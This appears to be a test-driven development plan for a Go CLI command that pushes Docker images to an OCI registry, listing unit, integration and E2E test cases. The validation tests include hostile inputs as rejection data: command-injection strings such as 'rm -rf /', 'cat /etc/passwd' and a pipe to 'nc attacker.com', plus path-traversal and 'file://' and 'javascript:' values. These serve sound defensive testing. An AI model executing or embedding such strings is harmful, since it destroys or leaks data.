# PROJECT TEST PLAN
## IDPBuilder OCI Push Command - Test-Driven Development Strategy

---

## Document Metadata

| Field | Value |
|-------|-------|
| **Project Name** | idpbuilder-oci-push-command |
| **Document Type** | Test Plan (R341 TDD Compliance) |
| **Test Approach** | Test-First Development |
| **Test Framework** | Go testing, Testify, Docker Test Containers |
| **Document Version** | v1.0 |
| **Created** | 2025-10-29 |
| **Status** | Ready for Implementation |
| **Based on** | planning/PROJECT-ARCHITECTURE.md |

---

## 1. Testing Philosophy & R341 TDD Compliance

### 1.1 Test-Driven Development Approach

**Core Principle: Tests BEFORE Implementation**
- All test cases designed during planning phase (NOW)
- Tests written BEFORE implementation code in each effort
- Implementation considered complete when tests pass
- No implementation without corresponding test specification

**R341 Compliance Requirements:**
1. ✅ **Pre-Implementation Test Design**: All test scenarios defined before coding begins
2. ✅ **Incremental Test Execution**: Tests runnable after each wave integration
3. ✅ **Verification Gates**: Each phase has clear test acceptance criteria
4. ✅ **Parallel Test Development**: Test infrastructure supports parallel effort testing
5. ✅ **Integration Validation**: Tests verify both functionality and component integration

### 1.2 Testing Pyramid for This Project

```
                    ▲
                   ╱ ╲
                  ╱   ╲
                 ╱ E2E ╲           ~10% (Phase 3 Wave 1)
                ╱───────╲
               ╱ Integ  ╲          ~30% (Phase 2 Wave 1-3)
              ╱───────────╲
             ╱   Unit     ╲        ~60% (Phase 1 Wave 2)
            ╱───────────────╲
           ────────────────────
```

**Test Distribution by Phase:**
- **Phase 1**: Focus on unit tests (85%+ coverage per package)
- **Phase 2**: Integration tests between components (80%+ coverage)
- **Phase 3**: E2E tests with real infrastructure (critical paths 95%+)

### 1.3 Test-First Workflow per Effort

**Mandatory Process for Each Effort:**
```bash
# Step 1: Read this test plan section for effort
# Step 2: Write test stubs/interfaces from test plan
# Step 3: Implement failing tests (RED phase)
# Step 4: Write minimal implementation (GREEN phase)
# Step 5: Refactor while maintaining tests (REFACTOR phase)
# Step 6: Verify coverage meets target
# Step 7: Code review validates test coverage
```

**Code Review Checkpoint:**
- Reviewers MUST verify tests were written first
- Check git history: test commits BEFORE implementation commits
- Reject PRs without corresponding test coverage
- Verify test plan compliance

---

## 2. Test Levels & Coverage Targets

### 2.1 Unit Tests

**Scope:** Individual functions, methods, and packages in isolation

**Coverage Targets:**
- Phase 1 (Interfaces & Core): **85% minimum**
- Phase 2 (Command Logic): **85% minimum**
- Critical paths (auth, TLS, push): **90%+**

**Test Isolation:**
- Mock all external dependencies (Docker daemon, registry)
- Use table-driven tests for input validation
- Test error paths explicitly
- Verify resource cleanup (defers, Close() calls)

**Tools:**
- `go test` with coverage
- `testify/mock` for mocking
- `testify/assert` for assertions

### 2.2 Integration Tests

**Scope:** Multiple components working together

**Coverage Targets:**
- Component integration: **80% minimum**
- Workflow paths: **90%+**

**Test Environment:**
- Docker daemon running locally
- Test registry (Docker container)
- Network simulation for failures

**Focus Areas:**
- Docker client → Registry client integration
- Auth provider → Registry client integration
- TLS config → Registry client integration
- Command orchestration of all components

### 2.3 System/E2E Tests

**Scope:** Complete workflows from CLI invocation to registry push

**Coverage Targets:**
- Happy paths: **100%**
- Error scenarios: **95%+**
- Edge cases: **85%+**

**Test Infrastructure:**
- Gitea container registry (official image)
- Docker daemon with test images
- Network failure injection
- TLS certificate scenarios

**Focus Areas:**
- Complete push workflow
- Authentication success/failure
- Network resilience
- Large image handling (100MB+)

### 2.4 Acceptance Tests

**Scope:** Verify PRD requirements met

**Coverage Targets:**
- All PRD functional requirements: **100%**
- All PRD non-functional requirements: **100%**

**Validation Matrix:**
| PRD Requirement | Test Case ID | Acceptance Criteria |
|-----------------|--------------|---------------------|
| FR-001: Push to Gitea | TC-E2E-001 | Image appears in Gitea registry |
| FR-002: Username/password auth | TC-E2E-002 | Authentication succeeds with valid creds |
| FR-003: Insecure mode | TC-E2E-003 | TLS verification bypassed with --insecure |
| NFR-001: Startup <500ms | TC-PERF-001 | Command initialization measured |
| NFR-002: Memory <200MB | TC-PERF-002 | Memory profiling during push |

---

## 3. Phase Test Strategies

### PHASE 1: Foundation & Interfaces

**Testing Goal:** Verify all interfaces are well-defined and implementable

**Test Strategy:**
- Interface contracts are TESTABLE before implementation
- Mock implementations validate interface design
- Unit tests for each package implementation
- Integration tests verify interfaces work together

**Phase 1 Success Criteria:**
- All interfaces compile and have example mock implementations
- Unit test coverage ≥85% for all packages (docker, registry, auth, tls)
- Zero interface changes required during Phase 2
- All package tests pass independently

---

### PHASE 2: Core Push Functionality

**Testing Goal:** Verify push command works end-to-end with all features

**Test Strategy:**
- Command unit tests for flag parsing and validation
- Integration tests for component orchestration
- Error handling tests for all failure modes
- Exit code validation tests

**Phase 2 Success Criteria:**
- Command executes successfully with all flag combinations
- All error scenarios have corresponding tests
- Integration tests validate component interaction
- Exit codes match PRD specification

---

### PHASE 3: Testing & Integration

**Testing Goal:** Comprehensive E2E validation and production readiness

**Test Strategy:**
- E2E tests with real Gitea registry
- Performance benchmarking
- Failure injection testing
- Documentation validation (examples must work)

**Phase 3 Success Criteria:**
- All E2E tests pass with real infrastructure
- Performance targets met (PRD requirements)
- Flaky test rate <1%
- Test suite runs in CI/CD reliably

---

## 4. Wave Test Coverage

### PHASE 1, WAVE 1: Interface & Contract Definitions

**Test Deliverables:**
- Mock implementations for all interfaces
- Interface compatibility tests
- Contract validation tests

**Test Cases:**

#### TC-IF-001: Docker Client Interface Validation
```go
// Test: Interface defines all required methods
func TestDockerClientInterfaceContract(t *testing.T) {
    // Verify interface has: ImageExists, GetImage, ValidateImageName, Close
    // Verify method signatures match architecture spec
    // Verify error types are defined
}
```

#### TC-IF-002: Registry Client Interface Validation
```go
// Test: Interface supports all push operations
func TestRegistryClientInterfaceContract(t *testing.T) {
    // Verify Push, BuildImageReference, ValidateRegistry methods
    // Verify ProgressCallback type signature
    // Verify ProgressUpdate struct fields
}
```

#### TC-IF-003: Auth Provider Interface Validation
```go
// Test: Interface compatible with go-containerregistry
func TestAuthProviderInterfaceContract(t *testing.T) {
    // Verify GetAuthenticator returns authn.Authenticator
    // Verify ValidateCredentials signature
    // Test with mock implementations
}
```

#### TC-IF-004: TLS ConfigProvider Interface Validation
```go
// Test: Interface provides valid tls.Config
func TestTLSConfigProviderInterfaceContract(t *testing.T) {
    // Verify GetTLSConfig returns *tls.Config
    // Verify IsInsecure method exists
    // Test mock implementation
}
```

#### TC-IF-005: Command Structure Compilation
```go
// Test: Cobra command structure compiles
func TestCommandStructureCompiles(t *testing.T) {
    // Verify command registers with cobra
    // Verify all flags defined
    // Verify help text present
}
```

**Wave 1 Test Success Criteria:**
- All interface mock implementations compile
- No implementation code (interfaces only)
- Contracts frozen and documented

---

### PHASE 1, WAVE 2: Core Package Implementations (Parallel)

**Test Deliverables:**
- Comprehensive unit tests for all packages
- 85%+ code coverage per package
- Mock dependency tests

**Effort 1.2.1: Docker Client Implementation**

#### TC-DOCKER-001: ImageExists with Valid Image
```go
func TestDockerClient_ImageExists_ValidImage(t *testing.T) {
    // Given: Mock Docker daemon with image "myapp:latest"
    // When: client.ImageExists(ctx, "myapp:latest")
    // Then: Returns (true, nil)
}
```

#### TC-DOCKER-002: ImageExists with Missing Image
```go
func TestDockerClient_ImageExists_MissingImage(t *testing.T) {
    // Given: Mock Docker daemon without image "missing:v1"
    // When: client.ImageExists(ctx, "missing:v1")
    // Then: Returns (false, nil)
}
```

#### TC-DOCKER-003: ImageExists with Daemon Connection Error
```go
func TestDockerClient_ImageExists_DaemonError(t *testing.T) {
    // Given: Docker daemon unreachable
    // When: client.ImageExists(ctx, "myapp:latest")
    // Then: Returns (false, error) with connection failure message
}
```

#### TC-DOCKER-004: GetImage Success
```go
func TestDockerClient_GetImage_Success(t *testing.T) {
    // Given: Mock Docker daemon with image "myapp:latest"
    // When: client.GetImage(ctx, "myapp:latest")
    // Then: Returns v1.Image object, nil error
    // And: Image has valid layers and config
}
```

#### TC-DOCKER-005: GetImage with Invalid Image Name
```go
func TestDockerClient_GetImage_InvalidName(t *testing.T) {
    // Given: Invalid image name "my@pp:!nv@lid"
    // When: client.GetImage(ctx, "my@pp:!nv@lid")
    // Then: Returns nil, error with validation failure
}
```

#### TC-DOCKER-006: ValidateImageName with Valid Names
```go
func TestDockerClient_ValidateImageName_Valid(t *testing.T) {
    validNames := []string{
        "myapp:latest",
        "namespace/myapp:v1.0.0",
        "registry.example.com/namespace/myapp:sha256-abc123",
    }
    // For each: ValidateImageName returns nil (valid)
}
```

#### TC-DOCKER-007: ValidateImageName with Invalid Names
```go
func TestDockerClient_ValidateImageName_Invalid(t *testing.T) {
    invalidNames := []string{
        "",              // empty
        "MY@PP:latest",  // invalid characters
        "app::",         // double colon
        "app:tag:extra", // multiple colons
    }
    // For each: ValidateImageName returns error
}
```

#### TC-DOCKER-008: Close Resource Cleanup
```go
func TestDockerClient_Close_ResourceCleanup(t *testing.T) {
    // Given: Docker client connected
    // When: client.Close()
    // Then: No error returned
    // And: Further operations fail with "client closed" error
}
```

**Effort 1.2.2: Registry Client Implementation**

#### TC-REGISTRY-001: Push Success
```go
func TestRegistryClient_Push_Success(t *testing.T) {
    // Given: Mock registry, mock v1.Image, valid auth
    // When: client.Push(ctx, image, "registry/namespace/myapp:latest", progressCallback)
    // Then: Returns nil (success)
    // And: Progress callbacks invoked for each layer
    // And: Manifest pushed after all layers
}
```

#### TC-REGISTRY-002: Push with Authentication Failure
```go
func TestRegistryClient_Push_AuthFailure(t *testing.T) {
    // Given: Mock registry rejecting auth
    // When: client.Push(ctx, image, "registry/myapp:latest", nil)
    // Then: Returns auth error
    // And: Error message indicates invalid credentials
}
```

#### TC-REGISTRY-003: Push with Network Failure
```go
func TestRegistryClient_Push_NetworkFailure(t *testing.T) {
    // Given: Mock registry returning network error during layer upload
    // When: client.Push(ctx, image, "registry/myapp:latest", nil)
    // Then: Returns network error
    // And: Error message indicates connectivity issue
}
```

#### TC-REGISTRY-004: Push with Progress Reporting
```go
func TestRegistryClient_Push_ProgressReporting(t *testing.T) {
    // Given: Mock registry, image with 3 layers
    // When: client.Push(ctx, image, "registry/myapp:latest", progressCallback)
    // Then: Progress callback invoked 3 times (one per layer)
    // And: Each callback has correct LayerDigest, LayerSize, BytesPushed
    // And: Status progresses: "uploading" → "complete"
}
```

#### TC-REGISTRY-005: BuildImageReference with Default Registry
```go
func TestRegistryClient_BuildImageReference_Default(t *testing.T) {
    // Given: Default registry "https://gitea.cnoe.localtest.me:8443/"
    // When: BuildImageReference(defaultRegistry, "myapp:latest")
    // Then: Returns "gitea.cnoe.localtest.me:8443/giteaadmin/myapp:latest"
}
```

#### TC-REGISTRY-006: BuildImageReference with Custom Registry
```go
func TestRegistryClient_BuildImageReference_Custom(t *testing.T) {
    // Given: Custom registry "https://registry.example.com/"
    // When: BuildImageReference(customRegistry, "namespace/myapp:v1.0.0")
    // Then: Returns "registry.example.com/namespace/myapp:v1.0.0"
}
```

#### TC-REGISTRY-007: BuildImageReference with Invalid URL
```go
func TestRegistryClient_BuildImageReference_InvalidURL(t *testing.T) {
    // Given: Invalid registry URL "not-a-url"
    // When: BuildImageReference("not-a-url", "myapp:latest")
    // Then: Returns error indicating invalid URL
}
```

#### TC-REGISTRY-008: ValidateRegistry Success
```go
func TestRegistryClient_ValidateRegistry_Success(t *testing.T) {
    // Given: Mock registry responding to ping
    // When: client.ValidateRegistry(ctx, "https://gitea.cnoe.localtest.me:8443/")
    // Then: Returns nil (registry reachable)
}
```

#### TC-REGISTRY-009: ValidateRegistry Unreachable
```go
func TestRegistryClient_ValidateRegistry_Unreachable(t *testing.T) {
    // Given: Registry not responding
    // When: client.ValidateRegistry(ctx, "https://unreachable.example.com/")
    // Then: Returns error indicating registry unreachable
}
```

**Effort 1.2.3: Authentication Implementation**

#### TC-AUTH-001: Basic Auth with Valid Credentials
```go
func TestAuthProvider_BasicAuth_Valid(t *testing.T) {
    // Given: username "giteaadmin", password "myP@ssw0rd"
    // When: provider.GetAuthenticator()
    // Then: Returns authn.Authenticator (not nil)
    // And: Authenticator produces valid Authorization header
}
```

#### TC-AUTH-002: Basic Auth with Special Characters
```go
func TestAuthProvider_BasicAuth_SpecialCharacters(t *testing.T) {
    specialPasswords := []string{
        "p@ss!word#123",           // symbols
        "pass word",               // space
        "pässwörd",                // unicode
        "p'\"ass",                 // quotes
        strings.Repeat("a", 256),  // long password (256 chars)
    }
    // For each: GetAuthenticator succeeds and produces valid base64
}
```

#### TC-AUTH-003: ValidateCredentials with Valid Input
```go
func TestAuthProvider_ValidateCredentials_Valid(t *testing.T) {
    // Given: username "user", password "pass"
    // When: provider.ValidateCredentials()
    // Then: Returns nil (valid)
}
```

#### TC-AUTH-004: ValidateCredentials with Empty Username
```go
func TestAuthProvider_ValidateCredentials_EmptyUsername(t *testing.T) {
    // Given: username "", password "pass"
    // When: provider.ValidateCredentials()
    // Then: Returns error "username cannot be empty"
}
```

#### TC-AUTH-005: ValidateCredentials with Empty Password
```go
func TestAuthProvider_ValidateCredentials_EmptyPassword(t *testing.T) {
    // Given: username "user", password ""
    // When: provider.ValidateCredentials()
    // Then: Returns error "password cannot be empty"
}
```

#### TC-AUTH-006: GetAuthenticator Returns go-containerregistry Compatible Type
```go
func TestAuthProvider_GetAuthenticator_Compatibility(t *testing.T) {
    // Given: Basic auth provider
    // When: authenticator := provider.GetAuthenticator()
    // Then: authenticator implements authn.Authenticator interface
    // And: authenticator.Authorization() returns valid header
}
```

**Effort 1.2.4: TLS Configuration Implementation**

#### TC-TLS-001: GetTLSConfig with Insecure Mode
```go
func TestTLSConfigProvider_GetTLSConfig_Insecure(t *testing.T) {
    // Given: ConfigProvider with insecure=true
    // When: tlsConfig := provider.GetTLSConfig()
    // Then: tlsConfig.InsecureSkipVerify == true
}
```

#### TC-TLS-002: GetTLSConfig with Secure Mode
```go
func TestTLSConfigProvider_GetTLSConfig_Secure(t *testing.T) {
    // Given: ConfigProvider with insecure=false
    // When: tlsConfig := provider.GetTLSConfig()
    // Then: tlsConfig.InsecureSkipVerify == false
    // And: tlsConfig.RootCAs uses system cert pool
}
```

#### TC-TLS-003: IsInsecure Returns Correct Value
```go
func TestTLSConfigProvider_IsInsecure(t *testing.T) {
    // Given: ConfigProvider with insecure=true
    // When: insecure := provider.IsInsecure()
    // Then: insecure == true

    // Given: ConfigProvider with insecure=false
    // When: insecure := provider.IsInsecure()
    // Then: insecure == false
}
```

#### TC-TLS-004: TLS Config Uses System Certificates in Secure Mode
```go
func TestTLSConfigProvider_SystemCerts_Secure(t *testing.T) {
    // Given: ConfigProvider with insecure=false
    // When: tlsConfig := provider.GetTLSConfig()
    // Then: tlsConfig.RootCAs is not nil
    // And: RootCAs contains system certificates
}
```

**Wave 2 Test Success Criteria:**
- All package unit tests pass
- Coverage ≥85% for docker, registry, auth, tls packages
- No integration between packages yet (Phase 2)
- All tests use mocked dependencies

---

### PHASE 2, WAVE 1: Command Implementation & Integration

**Test Deliverables:**
- Command unit tests
- Integration tests between packages
- Workflow orchestration tests

**Effort 2.1.1: Push Command Core Logic**

#### TC-CMD-001: Command Executes with All Required Flags
```go
func TestPushCommand_Execute_AllFlags(t *testing.T) {
    // Given: Mocked Docker client and registry client
    // When: Execute push command with all flags set
    // Then: Command succeeds (exit 0)
    // And: Docker client initialized
    // And: Registry client initialized with auth and TLS
    // And: Push workflow executed
}
```

#### TC-CMD-002: Command Fails with Missing Image Name
```go
func TestPushCommand_Execute_MissingImageName(t *testing.T) {
    // Given: Command with flags but no image name argument
    // When: Execute command
    // Then: Returns error "image name required"
    // And: Exit code 1
}
```

#### TC-CMD-003: Flag Validation - Valid Combinations
```go
func TestPushCommand_FlagValidation_Valid(t *testing.T) {
    validCombinations := []struct{
        registry string
        username string
        password string
        insecure bool
    }{
        {"https://gitea.cnoe.localtest.me:8443/", "giteaadmin", "pass", true},
        {"https://custom.registry.com/", "user", "p@ss", false},
    }
    // For each: Command accepts flags and executes
}
```

#### TC-CMD-004: Flag Validation - Invalid Combinations
```go
func TestPushCommand_FlagValidation_Invalid(t *testing.T) {
    // Case 1: Invalid registry URL
    // Case 2: Empty username with password provided
    // Case 3: Invalid image name format
    // For each: Command returns validation error
}
```

#### TC-CMD-005: Command Orchestration - Happy Path
```go
func TestPushCommand_Orchestration_HappyPath(t *testing.T) {
    // Given: All clients mocked successfully
    // When: Execute push command
    // Then: Steps executed in order:
    //   1. Validate arguments
    //   2. Initialize Docker client
    //   3. Validate image exists in Docker
    //   4. Initialize auth provider
    //   5. Initialize TLS config
    //   6. Initialize registry client
    //   7. Execute push
    //   8. Display success message
}
```

#### TC-CMD-006: Command Error Handling - Docker Daemon Down
```go
func TestPushCommand_ErrorHandling_DockerDaemonDown(t *testing.T) {
    // Given: Docker daemon unreachable
    // When: Execute push command
    // Then: Returns error "Docker daemon not running"
    // And: Exit code 1
    // And: Suggests "Start Docker daemon"
}
```

#### TC-CMD-007: Command Error Handling - Image Not Found
```go
func TestPushCommand_ErrorHandling_ImageNotFound(t *testing.T) {
    // Given: Docker daemon running but image doesn't exist
    // When: Execute push command
    // Then: Returns error "Image not found"
    // And: Exit code 4
    // And: Suggests "docker images" to list available
}
```

**Effort 2.1.2: Progress Reporting Implementation**

#### TC-PROGRESS-001: Progress Callback Invoked for Each Layer
```go
func TestProgressReporting_CallbackInvokedPerLayer(t *testing.T) {
    // Given: Image with 3 layers
    // When: Push with progress callback
    // Then: Callback invoked 3 times
    // And: Each invocation has unique LayerDigest
}
```

#### TC-PROGRESS-002: Progress Updates Show Bytes Pushed
```go
func TestProgressReporting_BytesPushedUpdates(t *testing.T) {
    // Given: Layer of 10MB
    // When: Push with progress callback
    // Then: Callbacks show BytesPushed incrementing
    // And: Final callback has BytesPushed == LayerSize
}
```

#### TC-PROGRESS-003: Progress Status Transitions
```go
func TestProgressReporting_StatusTransitions(t *testing.T) {
    // Given: Layer push simulation
    // When: Progress callbacks received
    // Then: Status transitions: "uploading" → "complete"
    // Or: "exists" if layer already in registry
}
```

#### TC-PROGRESS-004: Verbose Mode Shows Detailed Output
```go
func TestProgressReporting_VerboseMode(t *testing.T) {
    // Given: Command with --verbose flag
    // When: Execute push
    // Then: Output includes:
    //   - Layer digest
    //   - Layer size
    //   - Upload speed
    //   - Timestamp per layer
}
```

#### TC-PROGRESS-005: Progress Display Formatting
```go
func TestProgressReporting_DisplayFormatting(t *testing.T) {
    // When: Progress displayed
    // Then: Sizes formatted human-readable (MB, KB)
    // And: Percentages calculated correctly
    // And: Progress bar or status line rendered
}
```

**Wave 1 Test Success Criteria:**
- Command executes end-to-end with mocked clients
- All flag combinations tested
- Error handling comprehensive
- Progress reporting functional

---

### PHASE 2, WAVE 2: Advanced Features (Parallel)

**Test Deliverables:**
- Registry override tests
- Environment variable tests
- Precedence tests (flags > env > defaults)

**Effort 2.2.1: Custom Registry Override**

#### TC-OVERRIDE-001: Registry Flag Overrides Default
```go
func TestRegistryOverride_FlagOverridesDefault(t *testing.T) {
    // Given: --registry https://custom.registry.com/
    // When: Build image reference
    // Then: Uses custom registry instead of default
}
```

#### TC-OVERRIDE-002: Registry URL Validation - Valid URLs
```go
func TestRegistryOverride_ValidURLs(t *testing.T) {
    validURLs := []string{
        "https://registry.example.com/",
        "http://localhost:5000/",
        "https://gitea.cnoe.localtest.me:8443/",
    }
    // For each: BuildImageReference succeeds
}
```

#### TC-OVERRIDE-003: Registry URL Validation - Invalid URLs
```go
func TestRegistryOverride_InvalidURLs(t *testing.T) {
    invalidURLs := []string{
        "not-a-url",
        "ftp://registry.example.com/",  // wrong scheme
        "https://",                      // incomplete
    }
    // For each: Returns validation error
}
```

#### TC-OVERRIDE-004: Registry Override with HTTP
```go
func TestRegistryOverride_HTTP(t *testing.T) {
    // Given: --registry http://localhost:5000/ (HTTP not HTTPS)
    // When: Execute push
    // Then: Accepts HTTP registry
    // And: TLS not required for HTTP
}
```

**Effort 2.2.2: Environment Variable Support**

#### TC-ENV-001: Environment Variable Priority - Flags Win
```go
func TestEnvironmentVariables_FlagsOverrideEnv(t *testing.T) {
    // Given: IDPBUILDER_REGISTRY=https://env-registry.com/
    // And: --registry https://flag-registry.com/
    // When: Execute command
    // Then: Uses flag value (https://flag-registry.com/)
}
```

#### TC-ENV-002: Environment Variable Priority - Env Over Defaults
```go
func TestEnvironmentVariables_EnvOverridesDefaults(t *testing.T) {
    // Given: IDPBUILDER_REGISTRY=https://env-registry.com/
    // And: No --registry flag
    // When: Execute command
    // Then: Uses env value (https://env-registry.com/)
}
```

#### TC-ENV-003: IDPBUILDER_REGISTRY Environment Variable
```go
func TestEnvironmentVariables_Registry(t *testing.T) {
    // Given: IDPBUILDER_REGISTRY=https://custom.registry.com/
    // When: Execute command without --registry flag
    // Then: Uses custom registry from env
}
```

#### TC-ENV-004: IDPBUILDER_REGISTRY_USERNAME Environment Variable
```go
func TestEnvironmentVariables_Username(t *testing.T) {
    // Given: IDPBUILDER_REGISTRY_USERNAME=envuser
    // When: Execute command without --username flag
    // Then: Uses username from env
}
```

#### TC-ENV-005: IDPBUILDER_REGISTRY_PASSWORD Environment Variable
```go
func TestEnvironmentVariables_Password(t *testing.T) {
    // Given: IDPBUILDER_REGISTRY_PASSWORD=envP@ss
    // When: Execute command without --password flag
    // Then: Uses password from env
}
```

#### TC-ENV-006: IDPBUILDER_INSECURE Environment Variable
```go
func TestEnvironmentVariables_Insecure(t *testing.T) {
    // Given: IDPBUILDER_INSECURE=true
    // When: Execute command without --insecure flag
    // Then: Insecure mode enabled

    // Given: IDPBUILDER_INSECURE=false
    // When: Execute command
    // Then: Secure mode (TLS verification)
}
```

#### TC-ENV-007: Environment Variable Documentation in Help
```go
func TestEnvironmentVariables_HelpDocumentation(t *testing.T) {
    // When: Execute: idpbuilder push --help
    // Then: Help text includes:
    //   - IDPBUILDER_REGISTRY description
    //   - IDPBUILDER_REGISTRY_USERNAME description
    //   - IDPBUILDER_REGISTRY_PASSWORD description
    //   - IDPBUILDER_INSECURE description
    //   - Precedence explanation (flags > env > defaults)
}
```

**Wave 2 Test Success Criteria:**
- Registry override functional
- All environment variables work
- Precedence order correct
- Help text documents env vars

---

### PHASE 2, WAVE 3: Error Handling & Validation

**Test Deliverables:**
- Comprehensive validation tests
- Exit code tests
- Error message tests

**Effort 2.3.1: Input Validation & Sanitization**

#### TC-VALIDATE-001: Image Name Validation - OCI Spec Compliance
```go
func TestValidation_ImageName_OCISpec(t *testing.T) {
    validNames := []string{
        "myapp:latest",
        "namespace/myapp:v1.0.0",
        "registry.io/namespace/myapp:sha256-abc123",
        "my-app_v1.app:tag_1.0",
    }
    // For each: Validates successfully
}
```

#### TC-VALIDATE-002: Image Name Validation - Reject Invalid
```go
func TestValidation_ImageName_RejectInvalid(t *testing.T) {
    invalidNames := []string{
        "",                      // empty
        "MY@PP:latest",          // @ not allowed
        "app::latest",           // double colon
        "app:tag:extra",         // multiple colons
        "../../../etc/passwd",   // path traversal attempt
    }
    // For each: Returns validation error
}
```

#### TC-VALIDATE-003: Command Injection Prevention
```go
func TestValidation_CommandInjectionPrevention(t *testing.T) {
    injectionAttempts := []string{
        "myapp:latest; rm -rf /",
        "myapp:latest && cat /etc/passwd",
        "myapp:latest | nc attacker.com 1234",
        "myapp:$(whoami)",
    }
    // For each: Validation rejects or sanitizes
}
```

#### TC-VALIDATE-004: Registry URL Validation - Valid Schemes
```go
func TestValidation_RegistryURL_ValidSchemes(t *testing.T) {
    validURLs := []string{
        "https://registry.example.com/",
        "http://localhost:5000/",
    }
    // For each: Validates successfully
}
```

#### TC-VALIDATE-005: Registry URL Validation - Reject Invalid Schemes
```go
func TestValidation_RegistryURL_InvalidSchemes(t *testing.T) {
    invalidURLs := []string{
        "ftp://registry.example.com/",
        "file:///etc/passwd",
        "javascript:alert(1)",
    }
    // For each: Returns validation error
}
```

#### TC-VALIDATE-006: Credential Sanitization - Special Characters
```go
func TestValidation_CredentialSanitization(t *testing.T) {
    // Given: Password with special characters "p@ss'word\""
    // When: Validate credentials
    // Then: Accepts password without modification
    // And: Special characters handled correctly in base64
}
```

#### TC-VALIDATE-007: Validation Error Messages - Actionable
```go
func TestValidation_ErrorMessages_Actionable(t *testing.T) {
    // Given: Invalid image name "MY@PP:latest"
    // When: Validate image name
    // Then: Error message explains: "@ character not allowed in image names"
    // And: Suggests: "Use lowercase letters, numbers, hyphens, underscores only"
}
```

**Effort 2.3.2: Error Handling & Exit Codes**

#### TC-ERROR-001: Exit Code 0 - Success
```go
func TestErrorHandling_ExitCode0_Success(t *testing.T) {
    // Given: Successful push
    // When: Command completes
    // Then: Exit code 0
}
```

#### TC-ERROR-002: Exit Code 1 - General Error
```go
func TestErrorHandling_ExitCode1_GeneralError(t *testing.T) {
    // Given: Invalid flag combination
    // When: Execute command
    // Then: Exit code 1
    // And: Error message explains issue
}
```

#### TC-ERROR-003: Exit Code 2 - Authentication Failure
```go
func TestErrorHandling_ExitCode2_AuthFailure(t *testing.T) {
    // Given: Invalid username/password
    // When: Execute push
    // Then: Exit code 2
    // And: Error: "Authentication failed"
    // And: Suggestion: "Check username and password"
}
```

#### TC-ERROR-004: Exit Code 3 - Network/Registry Error
```go
func TestErrorHandling_ExitCode3_NetworkError(t *testing.T) {
    // Given: Registry unreachable
    // When: Execute push
    // Then: Exit code 3
    // And: Error: "Registry unreachable"
    // And: Suggestion: "Check network connectivity and registry URL"
}
```

#### TC-ERROR-005: Exit Code 4 - Image Not Found
```go
func TestErrorHandling_ExitCode4_ImageNotFound(t *testing.T) {
    // Given: Image doesn't exist in Docker daemon
    // When: Execute push
    // Then: Exit code 4
    // And: Error: "Image not found"
    // And: Suggestion: "Run 'docker images' to list available images"
}
```

#### TC-ERROR-006: Error Recovery Suggestions - Docker Daemon
```go
func TestErrorHandling_RecoverySuggestions_DockerDaemon(t *testing.T) {
    // Given: Docker daemon not running
    // When: Command fails
    // Then: Error message includes:
    //   - Problem: "Cannot connect to Docker daemon"
    //   - Suggestion: "Start Docker daemon with 'systemctl start docker'"
    //   - Context: Connection details
}
```

#### TC-ERROR-007: Error Recovery Suggestions - TLS Error
```go
func TestErrorHandling_RecoverySuggestions_TLSError(t *testing.T) {
    // Given: TLS certificate verification failure
    // When: Push fails
    // Then: Error message includes:
    //   - Problem: "TLS certificate verification failed"
    //   - Suggestion: "Use --insecure flag to bypass verification (not recommended for production)"
    //   - Context: Registry URL
}
```

**Wave 3 Test Success Criteria:**
- All validation edge cases covered
- Exit codes match PRD specification
- Error messages actionable
- 95%+ test coverage for validation logic

---

### PHASE 3, WAVE 1: Integration Testing

**Test Deliverables:**
- E2E tests with real infrastructure
- Integration test suite
- Performance benchmarks

**Effort 3.1.1: Integration Tests - Core Workflow**

#### TC-E2E-001: Complete Push Workflow - Gitea Registry
```go
func TestE2E_CompletePushWorkflow_Gitea(t *testing.T) {
    // Given: Gitea registry running in Docker container
    // And: Local Docker image "test-app:latest"
    // And: Valid Gitea credentials
    // When: Execute: idpbuilder push test-app:latest --password 'pass' --insecure
    // Then: Image appears in Gitea registry
    // And: Manifest and layers verifiable via Gitea API
    // And: Exit code 0
}
```

#### TC-E2E-002: Authentication Success
```go
func TestE2E_AuthenticationSuccess(t *testing.T) {
    // Given: Gitea registry with user "giteaadmin" password "admin123"
    // When: Execute: idpbuilder push test-app:latest --username giteaadmin --password 'admin123' --insecure
    // Then: Authentication succeeds
    // And: Push completes successfully
}
```

#### TC-E2E-003: Authentication Failure
```go
func TestE2E_AuthenticationFailure(t *testing.T) {
    // Given: Gitea registry
    // When: Execute: idpbuilder push test-app:latest --username wrong --password 'wrong' --insecure
    // Then: Authentication fails
    // And: Exit code 2
    // And: Error message: "Authentication failed"
}
```

#### TC-E2E-004: Insecure Mode TLS Bypass
```go
func TestE2E_InsecureModeTLSBypass(t *testing.T) {
    // Given: Gitea registry with self-signed certificate
    // When: Execute: idpbuilder push test-app:latest --password 'pass' --insecure
    // Then: TLS verification bypassed
    // And: Push succeeds
    // And: Warning displayed about insecure mode
}
```

#### TC-E2E-005: Secure Mode TLS Verification
```go
func TestE2E_SecureModeTLSVerification(t *testing.T) {
    // Given: Gitea registry with self-signed certificate
    // When: Execute: idpbuilder push test-app:latest --password 'pass' (no --insecure)
    // Then: TLS verification enforced
    // And: Push fails with certificate error
    // And: Exit code 3
}
```

#### TC-E2E-006: Large Image Push (100MB+)
```go
func TestE2E_LargeImagePush(t *testing.T) {
    // Given: Docker image with 100MB+ layers
    // When: Execute push
    // Then: All layers uploaded successfully
    // And: Progress reported for each layer
    // And: Total time <30 seconds (network-dependent)
}
```

#### TC-E2E-007: Test Infrastructure Setup/Teardown
```go
func TestE2E_InfrastructureSetupTeardown(t *testing.T) {
    // Setup:
    //   - Start Gitea container registry
    //   - Build test Docker image
    //   - Configure Gitea admin user
    // Test: (various E2E tests)
    // Teardown:
    //   - Remove test images from registry
    //   - Stop Gitea container
    //   - Clean Docker test images
}
```

**Effort 3.1.2: Integration Tests - Edge Cases**

#### TC-E2E-EDGE-001: Network Failure During Upload
```go
func TestE2E_NetworkFailureDuringUpload(t *testing.T) {
    // Given: Push in progress
    // When: Network disconnected mid-upload (simulated)
    // Then: Push fails gracefully
    // And: Error message indicates network failure
    // And: Exit code 3
}
```

#### TC-E2E-EDGE-002: Registry Becomes Unreachable
```go
func TestE2E_RegistryBecomesUnreachable(t *testing.T) {
    // Given: Push started successfully
    // When: Registry container stopped mid-push
    // Then: Error detected and reported
    // And: Error message: "Registry unreachable"
}
```

#### TC-E2E-EDGE-003: Missing Image in Docker Daemon
```go
func TestE2E_MissingImageInDockerDaemon(t *testing.T) {
    // Given: Image "nonexistent:latest" not in Docker
    // When: Execute: idpbuilder push nonexistent:latest --password 'pass'
    // Then: Error before attempting push
